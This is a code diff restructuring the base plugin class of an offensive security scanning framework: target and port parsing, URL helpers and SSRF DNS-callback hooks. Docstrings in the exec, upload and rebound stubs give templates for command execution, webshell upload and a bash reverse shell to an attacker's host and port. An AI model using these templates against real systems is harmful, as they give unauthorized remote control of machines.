@@ -1,131 +1,230 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# @author: 'orleven'
+# @author = 'orleven'
 
+import os
 import sys
 import socks
 import socket
-from lib.core.data import conf
-from lib.core.data import logger
-from lib.utils.curl import mycurl
-from lib.core.data import engine
+import urllib.parse
 from lib.api.api import _ceye_dns_api
 from lib.api.api import _ceye_verify_api
+from lib.core.data import conf
+from lib.core.data import logger
+from lib.utils.curl import curl
+from lib.utils.curl import geturl
+from lib.core.enums import SERVER_PORT_MAP
 
-service_table = {
-    "ftp": 21,
-    "ssh": 22,
-    "telnet": 23,
-    "smtp": 25,
-    "dns": 53,
-    "http": 80,
-    "rpc": 110,
-    "pop3": 110,
-    "netbios": 139,
-    "ldap": 389,
-    "https": 443,
-    "smb": 445,
-    "rsync": 873,
-    "imap": 993,
-    "sqlserver": 1433,
-    "oracle": 1521,
-    "zookeeper": 2181,
-    "mysql": 3306,
-    "rdp": 3389,
-    "postgresql": 5432,
-    "vnc": 5900,
-    "redis": 6379,
-    "elasticsearch": 9200,
-    'memcache': 11211,
-    '15672': 15672,
-    "dubbo": 20880,
-    "mongodb": 27017,
-}
+class Script(object):
+    def __init__(self, target=None, server_type=SERVER_PORT_MAP.WEB, parameter=None):
+        self.server_type = server_type
 
-def init(data,service='web'):
-    # Don't have url and port
-    service = service.lower()
-    if data['target_port'] == None or int(data['target_port']) == 0:
-        if service in service_table.keys():
-            data['target_port'] = service_table[service]
+        # in dev ...
+        # self.script_type = script_type
 
-    # socket proxy
-    if conf['config']['proxy']['proxy'].lower() == 'true':
-        try:
-            socks5_host, socks5_port = conf['config']['proxy']['socks5'].split(':')
-            socks.setdefaultproxy(socks.SOCKS5, socks5_host, int(socks5_port))
-            socket.socket = socks.socksocket
-        except Exception as e:
-            logger.error("Error socket proxy: %s" % conf['config']['proxy']['socks5'])
+        self.target_port_list = []
+        self.initialize_target(target)
+        self.initialize_parameter(parameter)
+        self.target = target
 
-    socket.setdefaulttimeout(int(conf['config']['basic']['timeout']))
+        self.parameter = {}
+        self.url = self.base_url = None
+        self.req = []
+        self.res = []
+        self.other = {}
 
-    # Don't have url but have port
-    if data['url'] == None:
-        if service == 'api':
-            data['url'] = data['base_url'] = 'http://' + data['target_host'] + ":" +str(data['target_port']) +'/'
+    def prove(self):
+        """subclass should override this function for prove
+            demo:
+                if vul:
+                    self.flag = 1
+                    self.req.append({"test": test})                     # for recode the request' info to database
+                    self.res.append({"info": test, "key": "test"})      # for recode the response' info to database and show info, key to console.
+        """
+        pass
+
+    def exec(self):
+        """subclass should override this function for exec
+            use self.parameter['cmd'] by -p cmd=whoami
+            demo:
+                res = os.system(self.parameter['cmd'])
+                if vul:
+                    self.flag = 1
+                    self.req.append({"test": test})                      # for recode the request' info to database
+                    self.res.append({"info": test, "key": "test"})       # for recode the response' info to database and show info, key to console.
+        """
+        pass
+
+    def upload(self):
+        """subclass should override this function for upload
+            use self.parameter['srcpath'] and self.parameter['despath'] by -p srcpath=webshell.jsp&despath=test.jsp
+            demo:
+                srcpath = self.parameter['srcpath']
+                despath = self.parameter['despath']
+                ... upload srcpath to despath...
+                if vul:
+                    self.flag = 1
+                    self.req.append({"test": srcpath})                # for recode the request' info to database
+                    self.res.append({"info": despath, "key": "test"}) # for recode the response' info to database and show info, key to console.
+        """
+        pass
+
+    def rebound(self):
+        """subclass should override this function for upload
+            use self.parameter['local_host'] and self.parameter['local_port'] by -p local_host=192.168.1.3&local_port=4444
+            demo:
+                local_host = self.parameter['local_host']
+                local_port = self.parameter['local_port']
+                cmd = '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=local_host, port=local_port)
+                res = os.system(cmd)
+                if vul:
+                    self.flag = 1
+                    self.req.append({"test": cmd})                      # for recode the request' info to database
+                    self.res.append({"info": 'success', "key": "test"}) # for recode the response' info to database and show info, key to console.
+        """
+        pass
+
+    def get_url(self):
+        if not self.url:
+            self.base_url = self.url = geturl(self.target_host, self.target_port)
+
+    def re_initialize(self,target, host, port, parameter):
+        self.target_host = host
+        self.target_port = port
+        self.parameter = parameter
+
+        if target.startswith('http://') or target.startswith('https://'):
+            self.url = target
+            protocol, s1 = urllib.parse.splittype(target)
+            host, s2 = urllib.parse.splithost(s1)
+            host, port = urllib.parse.splitport(host)
+            self.target_host = host
+            self.target_port = int(port) if port != None and port != 0 else 443 if protocol == 'https' else 80
+            _ = target[9:].find('/')
+            if _ == -1 :
+                self.url += '/'
+                self.base_url = self.url
+            else:
+                self.base_url = self.url[:_ + 10]
+
+        self.flag = -1
+        self.req = []
+        self.res = []
+        self.other = {}
+
+    def initialize_parameter(self,parameter):
+        if parameter != None:
+            for _key, _val in parameter.items():
+                if _key in self.__dict__.keys():
+                    logger.warning("This parameter name has already been used: %s = %s" % (_key, _val))
+                    logger.warning("And using this parameter name will cause the original value to be overwritten.")
+                    self.parameter[_key] = _val
+
+    def initialize_target(self, target):
+        if target :
+            if target.startswith('http://') or target.startswith('https://'):
+                self.url = target
+                protocol, s1 = urllib.parse.splittype(target)
+                host, s2 = urllib.parse.splithost(s1)
+                host, port = urllib.parse.splitport(host)
+                self.target_host = host
+                self.target_port = int(port) if port != None and port!= 0 else 443 if protocol == 'https' else 80
+                _ = target[9:].find('/')
+                if _ == -1:
+                    self.url += '/'
+                    self.base_url = self.url
+                else:
+                    self.base_url = self.url[:_ + 10]
+            else:
+                if ":" in target:
+                    _v = target.split(':')
+                    host, port = _v[0], _v[1]
+                    self.target_host = host
+                else:
+                    port = 0
+                    self.target_host = target
+
+                try:
+                    self.target_port = int(port)
+                except:
+                    self.target_port = 80
+
+            return True
         else:
-            data['url'], data['target_host'], data['target_port'] = geturl(data['target_host'], data['target_port'])
-            data['base_url'] = data['url']
+            return False
 
-    if conf['func_name'] == 'rebound':
-        local_host,local_port = get_rebound()
-        data['local_host'] = local_host
-        data['local_port'] = local_port
-    elif conf['func_name'] == 'sshkey':
-        public_key, private_key = get_ssh_key()
-        data['public_key'] = public_key
-        data['private_key'] = private_key
-    return data
+    def get_target_port_list(self):
 
-def curl(method,url, params = None, **kwargs):
-    return mycurl(method,url, params = params, **kwargs)
+        if self.target_port == None:
+            if isinstance(self.server_type, list):
+                for port in self.server_type:
+                    self.target_port_list.append((None, port))
+            else:
+                if self.server_type:
+                    self.target_port = self.server_type
+                    self.target_port_list.append((self.target, self.server_type))
+                else:
+                    return []
 
-def load_targets(target,service=None):
-    engine._load_target(target,service = service)
+        elif isinstance(self.target_port,int):
+            if self.target_port !=0:
+                self.target_port = self.target_port
+                self.target_port_list.append((self.target, self.target_port))
+            else:
+                if isinstance(self.server_type,list):
+                    for port in self.server_type:
+                        self.target_port_list.append((None, port))
+                else:
+                    if self.server_type:
+                        self.target_port = self.server_type
+                        self.target_port_list.append((self.target, self.server_type))
+                    else:
+                        return []
 
-def geturl(host, port, params = None, **kwargs):
-    for pro in ['http://', "https://"]:
-        _port = port if port != None and port != 0 else 443 if pro == 'https' else 80
-        _pro = 'https://' if port == 443 else pro
-        url = _pro + host + ":" + str(_port) + '/'
-        res = mycurl('head',url, params, **kwargs)
-        if res != None :
-            if res.status_code == 400 and 'The plain HTTP request was sent to HTTPS port' in res.text:
-                continue
-            return url,host,_port
-    return None,host,port
+        elif isinstance(self.target_port,list):
+            for port in self.target_port:
+                self.target_port_list.append((self.target, port))
 
-def get_ssh_key():
-    try:
-        public_key = conf['config']['ssh_key']['public_key']
-        private_key = conf['config']['ssh_key']['private_key']
-    except KeyError:
-        sys.exit(logger.error("Load tentacle config error: ssh_key, please check the config in tentacle.conf."))
-    return public_key,private_key
+        else:
+            return []
 
-def get_rebound():
-    try:
-        local_host = conf['config']['rebound']['local_host']
-        local_port = conf['config']['rebound']['local_port']
-    except KeyError:
-        sys.exit(logger.error("Load tentacle config error: rebound, please check the config in tentacle.conf."))
-    return local_host,local_port
+        return self.target_port_list
 
-def ceye_dns_api(t = 'url'):
-    '''
-    curl ssrf
-    :param t:
-    :return:
-    '''
-    return _ceye_dns_api(t = t)
+    def curl(self, method, url, params=None, **kwargs):
+        return curl(method, url, params=params, **kwargs)
 
-def ceye_verify_api(filter, t = 'dns'):
-    '''
-    verify ssrf
-    :param filter:
-    :param t:
-    :return:
-    '''
-    return _ceye_verify_api(filter = filter, t = t)
+
+    def read_file(self, filename, type = 'r'):
+        if os.path.isfile(filename):
+            with open(filename, type) as f:
+                return f.readlines()
+        logger.error("File is not exist: %s" %filename)
+        return None
+
+    def ceye_dns_api(self, t='url'):
+        '''
+        curl ssrf
+        :param t:
+        :return:
+        '''
+        return _ceye_dns_api(t=t)
+
+    def ceye_verify_api(self, filter, t='dns'):
+        '''
+        verify ssrf
+        :param filter:
+        :param t:
+        :return:
+        '''
+        return _ceye_verify_api(filter=filter, t=t)
+
+    def url_normpath(self, base, url):
+        from urllib.parse import urljoin
+        from urllib.parse import urlparse
+        from urllib.parse import urlunparse
+        from posixpath import normpath
+        url1 = urljoin(base, url)
+        arr = urlparse(url1)
+        path = normpath(arr[2])
+        return urlunparse((arr.scheme, arr.netloc, path, arr.params, arr.query, arr.fragment))
 
